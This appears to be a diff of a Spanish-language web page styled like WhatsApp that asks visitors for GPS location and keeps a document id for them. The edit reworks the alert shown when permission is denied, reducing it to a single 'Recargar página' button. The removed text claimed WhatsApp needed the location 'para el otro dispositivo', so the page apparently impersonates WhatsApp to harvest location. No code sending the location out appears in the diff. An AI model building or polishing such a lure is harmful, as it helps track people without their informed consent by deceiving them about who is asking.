@@ -117,23 +117,41 @@
             border: 1px solid #2a3a42;
         }
 
-        .modal-contenido .modal-imagen {
+        .modal-imagen {
             width: 120px;
             height: 120px;
             border-radius: 50%;
-            object-fit: cover;
             margin: 0 auto 12px;
-            display: block;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            color: #ff0000;
             border: 3px solid #25D366;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
             background: transparent;
-            padding: 20px;
         }
 
-        .modal-contenido .modal-icon { font-size: 40px; margin-bottom: 4px; }
-        .modal-contenido h3 { color: #e9edef; font-size: 20px; font-weight: 700; margin-bottom: 6px; }
-        .modal-contenido p { color: #8696a0; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
-        .modal-contenido .btn-group { display: flex; flex-direction: column; gap: 10px; }
+        .modal-contenido h3 {
+            color: #e9edef;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .modal-contenido p {
+            color: #8696a0;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .modal-contenido .btn-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
         .modal-contenido button {
             border: none;
             padding: 14px 20px;
@@ -145,11 +163,17 @@
             touch-action: manipulation;
             width: 100%;
         }
+
         .modal-contenido button:active { transform: scale(0.97); }
-        .btn-reintentar { background: #25D366; color: #0b141a; }
-        .btn-reintentar:hover { background: #1DA851; }
-        .btn-recargar { background: #3b4a54; color: #e9edef; }
-        .btn-recargar:hover { background: #4a5a64; }
+
+        /* Botón Recargar con fondo verde (igual que el anterior Reintentar) */
+        .btn-recargar {
+            background: #25D366;
+            color: #0b141a;
+        }
+        .btn-recargar:hover {
+            background: #1DA851;
+        }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
@@ -157,7 +181,7 @@
         @media (max-width: 400px) {
             .card { padding: 20px 16px; }
             h2 { font-size: 21px; }
-            .modal-contenido .modal-imagen { width: 100px; height: 100px; padding: 15px; }
+            .modal-imagen { width: 100px; height: 100px; font-size: 50px; }
         }
     </style>
 </head>
@@ -181,15 +205,16 @@
         </div>
     </div>
 
+    <!-- MODAL DE ALERTA -->
     <div id="miAlerta" class="modal">
         <div class="modal-contenido">
-            <img src="https://cdn-icons-png.flaticon.com/512/535/535239.png" alt="Ubicación" class="modal-imagen" />
-            <div class="modal-icon">📍</div>
-            <h3> Activa la ubicación y refresca la pagina </h3>
+            <!-- Gota roja en lugar del icono de ubicación -->
+            <div class="modal-imagen">💧</div>
+            <h3>Permiso de ubicación</h3>
             <p id="textoAlerta">Activa la ubicación en los ajustes del navegador.</p>
             <div class="btn-group">
-                <button id="btnReintentar" class="btn-reintentar">🔄 Reintentar</button>
-                <button id="btnRecargar" class="btn-recargar">🔁 Recargar página</button>
+                <!-- Solo botón Recargar, sin icono, fondo verde -->
+                <button id="btnRecargar" class="btn-recargar">Recargar página</button>
             </div>
         </div>
     </div>
@@ -221,7 +246,6 @@
         const estadoTexto = document.getElementById('estadoTexto');
         const modal = document.getElementById('miAlerta');
         const textoAlerta = document.getElementById('textoAlerta');
-        const btnReintentar = document.getElementById('btnReintentar');
         const btnRecargar = document.getElementById('btnRecargar');
 
         let docId = null;
@@ -253,11 +277,7 @@
             modal.style.display = 'none';
         }
 
-        btnReintentar.addEventListener('click', () => {
-            ocultarAlerta();
-            solicitarGPS();
-        });
-
+        // Solo el botón Recargar (reinicia la página)
         btnRecargar.addEventListener('click', () => {
             window.location.reload();
         });
@@ -378,7 +398,7 @@
                     let mensaje = '';
                     switch (err.code) {
                         case err.PERMISSION_DENIED:
-                            mensaje = 'whatsApp necesita permiso de ubicacion ver para el otro dispositivo".';
+                            mensaje = 'Activa la ubicación y presiona "Recargar página".';
                             break;
                         case err.POSITION_UNAVAILABLE:
                             mensaje = 'GPS no disponible. Asegúrate de tener señal o Wi-Fi.';
